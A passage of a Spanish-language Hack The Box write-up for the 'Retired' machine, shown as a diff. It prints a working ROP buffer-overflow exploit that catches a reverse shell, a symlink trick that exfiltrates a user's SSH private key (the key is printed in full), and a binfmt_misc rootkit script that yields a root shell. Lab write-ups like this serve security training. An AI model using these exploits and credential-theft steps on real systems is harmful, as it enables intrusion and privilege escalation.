+    context.clear(</span><span class="no">arch</span><span class="kd">=</span><span class="s2">'amd64'</span><span class="p">)
+    ssize </span><span class="kd">=</span><span class="p"> ssend </span><span class="kd">-</span><span class="p"> sbase
+    libc </span><span class="kd">=</span><span class="p"> ELF(file(libcp),</span><span class="no">checksec</span><span class="kd">=</span><span class="p">False)
+    libc.address </span><span class="kd">=</span><span class="p"> libcb
+    libsql </span><span class="kd">=</span><span class="p"> ELF(file(libsp),</span><span class="no">checksec</span><span class="kd">=</span><span class="p">False)
+    libsql.address </span><span class="kd">=</span><span class="p"> libsb
+
+    rop </span><span class="kd">=</span><span class="p"> ROP([libc, libsql])
+    prt </span><span class="kd">=</span><span class="p"> libc.symbols[</span><span class="s2">'mprotect'</span><span class="p">]
+    rdi </span><span class="kd">=</span><span class="p"> rop.rdi[</span><span class="na">0</span><span class="p">]
+    rsi </span><span class="kd">=</span><span class="p"> rop.rsi[</span><span class="na">0</span><span class="p">]
+    rdx </span><span class="kd">=</span><span class="p"> rop.rdx[</span><span class="na">0</span><span class="p">]
+    rsp </span><span class="kd">=</span><span class="p"> rop.jmp_rsp[</span><span class="na">0</span><span class="p">]
+
+    offset </span><span class="kd">=</span><span class="na"> 520</span><span class="p">
+
+    exploit </span><span class="kd">= </span><span class="k">b</span><span class="s2">'A'</span><span class="kd"> *</span><span class="p"> offset
+    exploit </span><span class="kd">+= </span><span class="p">p64(rdi)</span><span class="kd"> + </span><span class="p">p64(sbase)
+    exploit </span><span class="kd">+= </span><span class="p">p64(rsi)</span><span class="kd"> + </span><span class="p">p64(ssize)
+    exploit </span><span class="kd">+= </span><span class="p">p64(rdx)</span><span class="kd"> + </span><span class="p">p64(</span><span class="na">7</span><span class="p">)
+    exploit </span><span class="kd">+= </span><span class="p">p64(prt)
+    exploit </span><span class="kd">+= </span><span class="p">p64(rsp)
+    exploit </span><span class="kd">+= </span><span class="p">payload
+
+    requests.post(</span><span class="k">f</span><span class="s2">"http://10.10.11.154/activate_license.php"</span><span class="p">, </span><span class="no">files </span><span class="kd">=</span><span class="p"> { </span><span class="s2">"licensefile"</span><span class="p">: exploit } )
+
+threading.Thread(</span><span class="no">target</span><span class="kd">=</span><span class="p">bof, </span><span class="no">args</span><span class="kd">=</span><span class="p">()).start()
+shell </span><span class="kd">=</span><span class="p"> listen(</span><span class="na">443</span><span class="p">, </span><span class="no">timeout</span><span class="kd">=</span><span class="na">60</span><span class="p">).wait_for_connection()
+shell.sendline(</span><span class="k">b</span><span class="s2">"export TERM=xterm HOME=/var/www"</span><span class="p">)
+shell.interactive()</span>
+</code></pre></div></div>
+<div><p>La explicación de este script ha sido a grandes rasgos</p></div>
+<div><p>No necesitas cambiar valores o direcciones todo es pensado para ser dinámico, solo recuerda ejecutar como root porque la shell la recibirás en un puerto que necesita privilegios</p></div>
+<div><p>Simplemente ejecutamos el script, pasar la ip cuando la pida y en unos segundos recibir una shell</p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo python3</span><span class="p"> exploit.py
+[</span><span class="na">*</span><span class="p">] Introduce tu ip (tun0): 10.10.14.10
+[</span><span class="s2">+</span><span class="p">] Trying to bind to :: on port 443: Done
+[</span><span class="s2">+</span><span class="p">] Waiting for connections on :::443: Got connection from ::ffff:10.10.11.154
+[</span><span class="na">*</span><span class="p">] Loaded 190 cached gadgets for '/dev/shm/libc-2.31.so'
+[</span><span class="na">*</span><span class="p">] Loaded 162 cached gadgets for '/dev/shm/libsqlite3.so.0.8.6'
+[</span><span class="na">*</span><span class="p">] Switching to interactive mode
+</span><span class="kd">$</span><span class="p"> id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="kd">$</span><span class="p"> hostname -I
+10.10.11.154 dead:beef::250:56ff:feb9:7b35 
+</span><span class="kd">$</span>
+</code></pre></div></div>
+
+<div><p>Buscando posibles formas de escalar a root podemos ver algunos zip, podemos pensar que hay una tarea, podemos verla con list-timers</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">$ </span><span class="p">systemctl list-timers
+NEXT                           LEFT         UNIT                     ACTIVATES
+Sun 2022-06-12 23:56:00 UTC    30s left     website_backup.timer     </span><span class="kd">website_backup.service</span>
+</code></pre></div></div>
+
+<div><p>Tenemos el nombre asi que podemos buscar la tarea y ver lo que hace de la siguiente manera</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">$ </span><span class="p">find / -name website_backup.service 2>/dev/null
+/etc/systemd/system/website_backup.service
+</span><span class="kd">$ </span><span class="p">cat /etc/systemd/system/website_backup.service
+</span><span class="s2">[Unit]</span><span class="p">
+Description=Backup and rotate website
+
+</span><span class="s2">[Service]</span><span class="p">
+User=dev
+Group=www-data
+ExecStart=/usr/bin/webbackup
+
+</span><span class="s2">[Install]</span><span class="p">
+WantedBy=multi-user.target
+</span><span class="kd">$ </span><span class="p">cat /usr/bin/webbackup
+</span><span class="c1">#!/bin/bash
+</span><span class="k">set</span><span class="no"> -euf -o </span><span class="p">pipefail
+
+</span><span class="k">cd </span><span class="p">/var/www/
+
+SRC</span><span class="kd">=</span><span class="s2">/var/www/html</span><span class="p">
+DST</span><span class="kd">=</span><span class="s2">"/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"</span><span class="p">
+
+/usr/bin/rm </span><span class="no">--force -- </span><span class="s2">"$DST"</span><span class="p">
+/usr/bin/zip </span><span class="no">--recurse-paths </span><span class="s2">"$DST" "$SRC"</span><span class="p">
+
+KEEP</span><span class="kd">=</span><span class="s2">10</span><span class="p">
+/usr/bin/find /var/www/ </span><span class="no">-maxdepth </span><span class="p">1</span><span class="no"> -name</span><span class="s2"> '*.zip'</span><span class="no"> -print0</span><span class="p"> \
+    </span><span class="kd">| </span><span class="p">sort</span><span class="no"> --zero-terminated --numeric-sort --reverse </span><span class="p">\
+    </span><span class="kd">| while </span><span class="p">IFS= read </span><span class="no">-r -d </span><span class="s2">'' </span><span class="p">backup</span><span class="kd">; do
+        if </span><span class="k">[</span><span class="s2"> "$KEEP"</span><span class="no"> -le </span><span class="p">0 </span><span class="k">]</span><span class="kd">; then
+            /usr/bin/rm </span><span class="no">--force --</span><span class="s2"> "$backup"</span><span class="kd">
+        fi</span><span class="p">
+        KEEP</span><span class="kd">=</span><span class="s2">"$((KEEP-1))"</span><span class="kd">
+    done</span>
+</code></pre></div></div>
+
+<div><p>En pocas palabras dev cada minuto hace un zip de todo lo que hay en /var/www/html, entonces lo que podemos hacer es crear un enlace simpolico de la id_rsa de dev en /var/www/html</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">$ </span><span class="p">cd /var/www/html
+</span><span class="kd">$ </span><span class="p">ln -s /home/dev/.ssh/id_rsa id_rsa</span>
+</code></pre></div></div>
+
+<div><p>Ahora esperamos a que se cree un nuevo zip y cuando lo haga lo copiamos a /dev/shm, lo descomprimimos y deberiamos ver la id_rsa</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">$ </span><span class="p">cd /var/www
+</span><span class="kd">$ </span><span class="p">ls
+2022-06-13_00-04-01-html.zip
+2022-06-13_00-05-01-html.zip
+2022-06-13_00-06-01-html.zip
+</span><span class="kd">$ </span><span class="p">cp 2022-06-13_00-06-01-html.zip /dev/shm
+</span><span class="kd">$ </span><span class="p">cd /dev/shm
+</span><span class="kd">$ </span><span class="p">unzip 2022-06-13_00-06-01-html.zip
+</span><span class="kd">$ </span><span class="p">cat var/www/html/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+7rTyG3wbNka1sAAAALZGV2QHJldGlyZWQ=
+-----END OPENSSH PRIVATE KEY-----</span>
+</code></pre></div></div>
+
+<div><p>Podemos conectarnos por ssh a dev, ahora tenemos el user</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> dev@10.10.11.154 -i id_rsa
+</span><span class="s2">dev@retired</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt
+d69**************************b8c</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver un directorio emuemu que dentro contiene un "reg_helper" y un .c con el codigo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">dev@retired</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls
+activate_license  emuemu  user.txt
+</span><span class="s2">dev@retired</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls emuemu
+Makefile  README.md  emuemu  emuemu.c  exploit.sh  reg_helper  reg_helper.c  test
+</span><span class="s2">dev@retired</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat emuemu/reg_helper.c
+</span><span class="kd">#define </span><span class="k">_GNU_SOURCE
+
+</span><span class="kd">#include </span><span class="s2">&ltfcntl.h>
+</span><span class="kd">#include </span><span class="s2">&ltstdio.h>
+</span><span class="kd">#include </span><span class="s2">&ltstring.h>
+</span><span class="kd">#include </span><span class="s2">&ltsys/stat.h>
+</span><span class="kd">#include </span><span class="s2">&ltsys/types.h>
+</span><span class="kd">#include </span><span class="s2">&ltunistd.h>
+
+</span><span class="k">int main</span><span class="p">(</span><span class="no">void</span><span class="p">) {
+    </span><span class="k">char</span><span class="p"> cmd[</span><span class="na">512</span><span class="p">] </span><span class="kd">=</span><span class="p"> { </span><span class="na">0</span><span class="p"> };
+
+    read(STDIN_FILENO, cmd, </span><span class="kd">sizeof</span><span class="p">(cmd)); cmd[</span><span class="kd">-</span><span class="na">1</span><span class="p">]</span><span class="kd"> = </span><span class="na">0</span><span class="p">;
+
+    </span><span class="k">int fd </span><span class="kd">=</span><span class="p"> open(</span><span class="s2">"/proc/sys/fs/binfmt_misc/register"</span><span class="p">, O_WRONLY);
+    </span><span class="kd">if</span><span class="p"> (</span><span class="kd">-</span><span class="na">1</span><span class="kd"> ==</span><span class="p"> fd)
+        </span><span class="k">perror</span><span class="p">(</span><span class="s2">"open"</span><span class="p">);
+    </span><span class="kd">if </span><span class="p">(write(fd, cmd, strnlen(cmd,</span><span class="kd">sizeof</span><span class="p">(cmd)))</span><span class="kd"> == -</span><span class="na">1</span><span class="p">)
+        </span><span class="k">perror</span><span class="p">(</span><span class="s2">"write"</span><span class="p">);
+    </span><span class="kd">if </span><span class="p">(close(fd)</span><span class="kd"> == -</span><span class="na">1</span><span class="p">)
+        </span><span class="k">perror</span><span class="p">(</span><span class="s2">"close"</span><span class="p">);
+
+    </span><span class="kd">return</span><span class="na"> 0</span><span class="p">;
+}</span>
+</code></pre></div></div>
+
+<div><p>Aunque no tenemos muchos permisos hay otro reg_helper exactamente igual</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">dev@retired</span><span class="p">:</span><span class="na">~</span><span class="p">$ find / -name reg_helper 2>/dev/null
+/usr/lib/emuemu/reg_helper
+/home/dev/emuemu/reg_helper
+</span><span class="s2">dev@retired</span><span class="p">:</span><span class="na">~</span><span class="p">$ diff /home/dev/emuemu/reg_helper /usr/lib/emuemu/reg_helper
+</span><span class="s2">dev@retired</span><span class="p">:</span><span class="na">~</span><span class="p">$
+</code></pre></div></div>
+
+<div><p>Si miramos el código encontramos algun tipo de ruta en /proc</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">/proc/sys/fs/binfmt_misc/register</span></code></pre></div></div>
+<div><p>Encontramos un <a href="https://github.com/toffan/binfmt_misc/blob/master/binfmt_rootkit">exploit</a> en github solo que hay que cambiar algunas cosas, iniciando por las lineas de not_writable, las eliminaremos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">function </span><span class="p">not_writeable</span><span class="kd">()
+{
+        </span><span class="p">test </span><span class="kd">!</span><span class="k"> -w </span><span class="s2">"$mountpoint/register"</span><span class="p">
+</span><span class="kd">}</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">not_writeable </span><span class="kd">&&</span><span class="p"> die </span><span class="s2">"Error: $mountpoint/register is not writeable"</span>
+</code></pre></div></div>
+<div><p>Ahora la ruta donde hace el echo la cambiaremos por la que conseguimos antes de la siguiente manera</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">echo </span><span class="s2">"$binfmt_line"</span><span class="kd"> > </span><span class="s2">"$mountpoint"</span><span class="p">/register
+</span><span class="kd">echo </span><span class="s2">"$binfmt_line"</span><span class="kd"> | </span><span class="p">/usr/lib/emuemu/reg_helper</span>
+</code></pre></div></div>
+
+<div><p>El exploit quedaria de la siguiente manera</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/bin/bash
+
+</span><span class="kd">readonly </span><span class="p">searchsuid</span><span class="kd">=</span><span class="s2">"/bin/"</span><span class="kd">
+readonly</span><span class="p"> mountpoint</span><span class="kd">=</span><span class="s2">"/proc/sys/fs/binfmt_misc"</span><span class="kd">
+readonly</span><span class="p"> exe</span><span class="kd">=</span><span class="s2">"$0"
+
+
+</span><span class="k">warn</span><span class="p">()
+{
+    </span><span class="na">1</span><span class="kd">>&</span><span class="na">2 </span><span class="k">echo</span><span class="p"> $@
+}
+
+</span><span class="kd">die</span><span class="p">()
+{
+    warn $@
+    </span><span class="k">exit</span><span class="p"> -1
+}
+
+</span><span class="k">usage</span><span class="p">()
+{
+    cat </span><span class="na">1</span><span class="kd">>&</span><span class="na">2 </span><span class="kd">&lt&ltEOF
+</span><span class="s2">Usage:</span><span class="p"> $exe
+    </span><span class="s2">Gives you a root shell if /proc/sys/fs/binfmt_misc/register is writeable,
+    note that it must be enforced by any other mean before your try this, for
+    example by typing something like "sudo chmod +6 /*/*/f*/*/*r" while Dave is
+    thinking that you are fixing his problem.</span><span class="kd">
+EOF</span><span class="k">
+    exit</span><span class="p"> 1
+}
+
+</span><span class="k">function pick_suid</span><span class="p">()
+{
+	find </span><span class="s2">"$1"</span><span class="no"> -perm -4000 -executable </span><span class="p">\
+	    </span><span class="kd">| </span><span class="p">tail </span><span class="no">-n </span><span class="p">1
+}
+
+</span><span class="k">function read_magic</span><span class="p">()
+{
+    </span><span class="k">[[</span><span class="no"> -e</span><span class="s2"> "$1"</span><span class="k"> ]] </span><span class="kd">&&</span><span class="p"> \
+    </span><span class="k">[[</span><span class="s2"> "$2"</span><span class="kd"> =~</span><span class="k"> [[</span><span class="p">:digit:</span><span class="k">]]</span><span class="p">+</span><span class="k"> ]]</span><span class="kd"> &&</span><span class="p"> \
+    dd if="$1" bs=1 count="$2" status=none \
+        </span><span class="kd">| </span><span class="p">sed </span><span class="no">-e </span><span class="s2">'s-\x00-\\x00-g'</span><span class="p">
+}
+
+</span><span class="k">[[</span><span class="no"> -n </span><span class="s2">"$1"</span><span class="k"> ]]</span><span class="kd"> &&</span><span class="p"> usage
+
+target</span><span class="kd">=</span><span class="s2">"$(pick_suid "$searchsuid")"</span><span class="p">
+test </span><span class="no">-e</span><span class="s2"> "$target"</span><span class="kd"> ||</span><span class="p"> die</span><span class="s2"> "Error: Unable to find a suid binary in $searchsuid"</span><span class="p">
+
+binfmt_magic</span><span class="kd">=</span><span class="s2">"$(read_magic "$target" "126")"</span><span class="p">
+test </span><span class="no">-z </span><span class="s2">"$binfmt_magic" </span><span class="kd">&&</span><span class="p"> die</span><span class="s2"> "Error: Unable to retrieve a magic for $target"</span><span class="p">
+
+fmtname</span><span class="kd">=</span><span class="s2">"$(mktemp -u XXXX)"</span><span class="p">
+fmtinterpr</span><span class="kd">=</span><span class="s2">"$(mktemp)"</span><span class="p">
+
+gcc </span><span class="no">-o </span><span class="s2">"$fmtinterpr"</span><span class="mo"> -xc </span><span class="p">-</span><span class="kd"> <<- __EOF__</span><span class="s2">
+	#include &ltstdlib.h>
+	#include &ltunistd.h>
+	#include &ltstdio.h>
+	#include &ltpwd.h>
+
+	int main(int argc, char *argv[])
+	{
+		// remove our temporary file
+		unlink("$fmtinterpr");
+
+		// remove the unused binary format
+		FILE* fmt = fopen("$mountpoint/$fmtname", "w");
+		fprintf(fmt, "-1\\n");
+		fclose(fmt);
+
+		// MOTD
+		setuid(0);
+		uid_t uid = getuid();
+		uid_t euid = geteuid();
+		struct passwd *pw = getpwuid(uid);
+		struct passwd *epw = getpwuid(euid);
+		fprintf(stderr, "uid=%u(%s) euid=%u(%s)\\n",
+			uid,
+			pw->pw_name,
+			euid,
+			epw->pw_name);
+
+		// welcome home
+		char* sh[] = {"/bin/sh", (char*) 0};
+		execvp(sh[0], sh);
+		return 1;
+	}</span><span class="kd">
+__EOF__</span><span class="p">
+
+chmod a+x </span><span class="s2">"$fmtinterpr"</span><span class="p">
+
+binfmt_line</span><span class="kd">=</span><span class="s2">"_${fmtname}_M__${binfmt_magic}__${fmtinterpr}_OC"
+</span><span class="k">echo </span><span class="s2">"$binfmt_line"</span><span class="kd"> | </span><span class="p">/usr/lib/emuemu/reg_helper
+
+</span><span class="k">exec</span><span class="s2"> "$target"</span>
+</code></pre></div></div>
+
+<div><p>Solo queda darle permisos de ejecución y ejecutarlo, somos root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">dev@retired</span><span class="p">:</span><span class="na">~</span><span class="p">$ chmod +x exploit.sh
+</span><span class="s2">dev@retired</span><span class="p">:</span><span class="na">~</span><span class="p">$ ./exploit.sh
+uid=0(root) euid=0(root)
+# cat /root/root.txt
+89b**************************681
+#</span>
+</code></pre></div></div>
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
